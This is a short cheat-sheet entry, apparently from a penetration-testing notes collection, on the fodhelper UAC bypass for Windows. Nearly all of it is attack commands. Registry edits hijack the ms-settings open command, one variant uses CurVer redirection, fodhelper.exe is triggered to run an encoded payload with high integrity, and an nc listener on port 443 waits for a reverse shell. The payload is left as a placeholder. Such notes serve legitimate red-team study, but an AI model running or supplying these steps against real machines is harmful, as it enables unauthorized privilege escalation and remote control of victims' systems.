---
title: fodhelper UAC Bypass (AD context)
category: ad
subcategory: ad-attacks
os: windows
command: REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "<encoded payload>"
tools: reg, fodhelper
---


### Direct ms-settings hijack

```cmd
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "<base64 powershell -enc payload>" /f
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
fodhelper.exe
REG query HKCU\Software\Classes\ms-settings\Shell\Open\command
```

### CurVer redirection variant

```cmd
REG ADD "HKCU\Software\Classes\.thm\Shell\Open\command" /d "<encoded payload>" /f
REG ADD "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
```

### Listener and trigger

```bash
nc -nvlp 443
```

```cmd
fodhelper.exe
whoami /all
```

Look for `Mandatory Label` showing high integrity.
